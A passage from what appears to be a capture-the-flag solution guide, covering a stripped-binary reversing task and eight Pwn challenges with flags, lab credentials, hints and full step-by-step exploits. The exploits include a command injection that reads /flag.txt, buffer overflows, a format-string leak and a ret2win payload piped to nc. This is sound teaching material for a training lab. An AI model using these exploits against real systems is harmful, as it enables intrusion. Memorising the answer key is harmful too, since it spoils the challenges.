**Common mistakes:** Reading `$0x2a` as 2A or 20: it's hexadecimal, 42. Trying 8 digits adding up to 42 but with spaces in between.

### Reversing 15. No Names (★★★ Hard, 100)

**Teaches:** Breaking on a library function in a stripped program, and `x/s`.  
**Where:** `ssh nonames@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{n0_n4m3s_n0_pr0bl3m}`

**Steps:**

1. `break wipe` fails: no names. (Answer `n` to its question.)
   ```text
   Function "wipe" not defined.
   Make breakpoint pending on future shared library load? n
   ```
2. `break memset`, `run`: gdb pauses in libc, shown as `?? ()`.
   ```text
   Starting program: /home/nonames/nonames 
   [Thread debugging using libthread_db enabled]
   Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
   This program's names have all been scrubbed off.
   It knew the flag for a moment...
   
   Breakpoint 1, 0x00007b82d4f084c0 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
   ```
3. `x/s $rdi` prints the memory about to be wiped.
   ```text
   0x7ffd35f28610:	"FLAG{n0_n4m3s_n0_pr0bl3m}"
   ```

**Hints** (what a team that bought them has been told):

- (10 points) Run `ltrace ./nonames` to see which library functions it calls. `memset` fills memory with zeros: that's the wipe. gdb can pause at a library function by its name.
- (10 points) `gdb ./nonames`, then `break memset`, then `run`. gdb shows the pause as `?? ()` in `libc.so.6`, because the library's own names are scrubbed too, but it's memset. The address of the memory being wiped is in a register called `rdi`, and `x/s $rdi` prints it as text.

**Common mistakes:** Thinking `?? ()` means it paused in the wrong place. `x/s rdi` without the `$`.

## Pwn

### Pwn 1. Secret Menu (★ Easy, 30)

**Teaches:** Reading the source to find a menu choice that isn't printed.  
**Where:** `ssh menu@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9041`  
**Flag:** `FLAG{s3cr3t_m3nu_unl0ck3d}`

**Steps:**

1. In `shaula.c`, the `switch` has a `case 314:` that the on-screen menu never lists.
2. Connect and type `314`.
   ```text
   Welcome, guide. Here's tonight's code:
   FLAG{s3cr3t_m3nu_unl0ck3d}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In the source, find the `switch` section. Each `case` is a menu choice, and its number is what you type. One case isn't on the printed menu.

**Common mistakes:** Typing only one of the three visible choices.

### Pwn 2. Store Credit (★ Easy, 30)

**Teaches:** A missing check on a negative quantity (a logic bug).  
**Where:** `ssh shop@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9042`  
**Flag:** `FLAG{n3g4t1v3_sh0pp1ng_spr33}`

**Steps:**

1. In `sargas.c`, the cost is `count * 10` and there's no check that `count` is positive. Choose to buy the cheap item, and ask for `-100` of them: the cost comes out negative, so your credits go up instead of down.
   ```text
   Thanks for your purchase!
   
   You have 1100 credits.
   1) Buy star maps (10 credits each)
   2) Buy the flag (1000 credits)
   3) Leave
   >
   ```
2. Now choose to buy the flag.
   ```text
   FLAG{n3g4t1v3_sh0pp1ng_spr33}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Look at how the cost is worked out from the number of items, and how it changes your credits. What happens if you buy fewer than zero items?
- (10 points) Buy the cheap item, and say you want `-100` of them. The cost comes out negative, so instead of taking credits away, it adds them. Now you can afford the flag.

**Common mistakes:** Only trying positive amounts.

### Pwn 3. Name Tag (★ Easy, 30)

**Teaches:** A buffer overflow spilling into the next variable.  
**Where:** `ssh nametag@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9043`  
**Flag:** `FLAG{n4m3_t00_l0ng_f0r_th3_t4g}`

**Steps:**

1. In `lesath.c`, `name` is 16 bytes with `is_astronomer` right after it. Sign in with 20 or more letters: the name is only 16 bytes, so the extra letters overrun into `is_astronomer` and make it non-zero.
   ```text
   Welcome, AAAAAAAAAAAAAAAAAAA!
   Astronomer badge detected. Here's the archive key:
   FLAG{n4m3_t00_l0ng_f0r_th3_t4g}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Try signing in with a really long name: twenty letters or more.

**Common mistakes:** A short name stays a visitor and gets no flag.

### Pwn 4. Blank Password (★ Easy, 30)

**Teaches:** `strncmp` with a length taken from the attacker's own input.  
**Where:** `ssh vault@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9044`  
**Flag:** `FLAG{bl4nk_p4ssw0rd_w0rks}`

**Steps:**

1. In `fang.c`, the check is `strncmp(guess, passcode, strlen(guess))`. Press Enter with nothing typed: it then compares zero characters, which always matches.
   ```text
   Access granted.
   FLAG{bl4nk_p4ssw0rd_w0rks}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `strncmp(a, b, n)` compares only the first `n` characters of two pieces of text. Look at where this program gets `n` from. What's the smallest it can be?
- (10 points) It checks `strlen(your guess)` characters, that is, as many as you typed. Type nothing at all and press Enter: it then checks zero characters, and zero characters always match.

**Common mistakes:** Trying to guess the random 16-letter passcode.

### Pwn 5. Greeter (★ Easy, 30)

**Teaches:** Command injection through a shell metacharacter.  
**Where:** `ssh greeter@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9045`  
**Flag:** `FLAG{s3m1c0l0n_s4ys_h3ll0}`

**Steps:**

1. In `larawag.c`, the program runs `echo Hello, <your name>` through a shell. Enter the name `; cat /flag.txt`, so the `;` starts a second command.
   ```text
   Hello,
   FLAG{s3m1c0l0n_s4ys_h3ll0}
   Clear skies from Larawag.
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In a terminal, `;` ends one command and starts the next, so `echo hi; ls` runs both. Put that idea into the name you give the greeter.
- (10 points) Enter the name `; cat /flag.txt`. The greeter runs `echo Hello,` then your `cat /flag.txt`.

**Common mistakes:** Entering a plain name.

### Pwn 6. Exact Fit (★★ Medium, 60)

**Teaches:** A precise overflow writing one chosen value, little-endian.  
**Where:** `ssh exactfit@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9046`  
**Flag:** `FLAG{3x4ct_f1t_k3y}`

**Steps:**

1. In `dschubba.c`, `struct record` is `name[32]`, then `visits` (4 bytes), then `key`: so `key` is 36 bytes past the start of `name`.
   ```text
   0x41564f4e little-endian = 'NOVA'
   ```
2. Type 36 characters, then `NOVA` (the four bytes of `0x41564f4e`, lowest byte first).
   ```text
   Key on file: 0x41564f4e
   Key accepted.
   FLAG{3x4ct_f1t_k3y}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Look at `struct record` in the source. Add up the size of every field before `key` to work out how many characters to type first. A `char` is 1 byte and an `unsigned int` is 4 bytes.
- (10 points) The fields before `key` are `name` (32 bytes) and `visits` (4 bytes), so type 36 characters first. The key must read `0x41564f4e`: that's four bytes, `41`='A', `56`='V', `4f`='O', `4e`='N'. The computer stores the lowest byte first, so you type them in reverse. After 36 characters, type `NOVA`.

**Common mistakes:** Typing the bytes the wrong way round (`AVON`). Forgetting the `visits` field and only padding 32.

### Pwn 7. Echo Echo (★★ Medium, 60)

**Teaches:** A format-string bug that leaks memory with `%N$s`.  
**Where:** `ssh echoecho@192.168.68.103 -p 2240` (password `pwnit`), or `nc 192.168.68.103 9047`  
**Flag:** `FLAG{3ch0_3ch0_l34k3d}`

**Steps:**

1. In `acrab.c`, your message is passed straight to `printf`. `%p %p %p %p` prints raw values from the stack instead of your text: the bug works.
   ```text
   Transmitting: 0x7ffdc30e5f90 (nil) (nil) (nil)
   
   Callsign:
   ```
2. `%N$s` prints the Nth value as the text it points to. Counting up, `%31$s` on this build points at the flag.
   ```text
   Transmitting: FLAG{3ch0_3ch0_l34k3d}
   
   
   Callsign:
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Type `%p %p %p %p` as your message and you'll see values from memory instead of your text. That's the bug working.
- (10 points) `%7$s` means "take the 7th value and print whatever text it points to". Try the numbers going up: `%1$s`, `%2$s`, and so on. The flag's pointer is well down the list, past `%25$s`. A blank line or a disconnect just means that value wasn't a text pointer, so reconnect and try the next number.

**Common mistakes:** Giving up early: the flag's pointer is well down the stack (%31$s here), so keep counting up. A blank line or a disconnect just means that slot wasn't a text pointer; reconnect and try the next number.

### Pwn 8. Return to Sender (★★★ Hard, 100)

**Teaches:** A return-to-function overflow ("ret2win").  
**Where:** `nc 192.168.68.103 9048` (raw bytes needed; from a Linux account, `nc antares 9001`)  
**Flag:** `FLAG{r3turn_t0_s3nd3r_w1n}`

**Steps:**

1. Connect once and read the address the program prints for `supernova` (`antares.c` shows that `supernova` reads and prints the flag) (here `0x4017c5`; it's the same every time, because the program isn't randomised).
   ```text
   supernova() is at 0x4017c5
   ```
2. Overflow 72 bytes (64 for the buffer, 8 for saved data), then the address little-endian. From a Linux account: `{ printf 'A%.0s' {1..72}; printf '\xc5\x17\x40'; } | nc antares 9001`.
   ```text
   Antares core monitor online.
   Diagnostics: supernova() is at 0x4017c5
   Enter fusion reading:
   Reading logged.
   *** CORE COLLAPSE ***
   FLAG{r3turn_t0_s3nd3r_w1n}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) The buffer is 64 bytes, and 8 more bytes of saved data sit before the return address. That's 72 bytes in total before it. The program prints `supernova`'s address every time you connect: read it first.
- (20 points) Addresses are stored backwards (little-endian). On a Linux account, `printf` sends exact bytes and `nc` sends them on. If the address is `0x4017c5`, that's the bytes `\xc5\x17\x40`, so run: `{ printf 'A%.0s' {1..72}; printf '\xc5\x17\x40'; } | nc antares 9001`. Use the address the program actually showed you.

**Common mistakes:** Windows can't send raw bytes from the keyboard: use `nc` from a Linux challenge account, where `printf` builds the bytes. Wrong number of A's: it's 64 (buffer) + 8 (saved frame pointer) = 72 before the return address.

